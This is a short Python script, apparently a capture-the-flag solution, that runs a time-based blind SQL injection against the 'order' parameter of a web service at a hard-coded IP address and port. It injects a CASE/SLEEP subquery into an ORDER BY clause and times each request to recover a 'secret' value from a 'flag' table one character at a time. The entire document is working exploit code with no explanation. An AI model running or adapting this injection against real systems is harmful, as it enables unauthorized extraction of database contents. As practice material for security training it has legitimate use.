import requests,string, time
arr = '_'  +string.ascii_uppercase +string.digits + string.ascii_lowercase  +string.punctuation
s = requests.session()
def bind(step):
    for i in arr:
        a = time.time()
        url = f"http://125.235.240.166:20105/index?order=price asc, (select case when (select ascii(mid((select secret from flag limit 1),{step},1))) LIKE {ord(i)} then sleep(2) else 1 end)"
        s.get(url)
        b = time.time()
        if  b-a > 8:
            return i
    return None   
def flag():
    flag = ''
    d = len(flag) + 1
    while 1:
        c = bind(d)
        if c == None:
            return flag
        flag += c
        d += 1
        print(flag) 

print(flag())
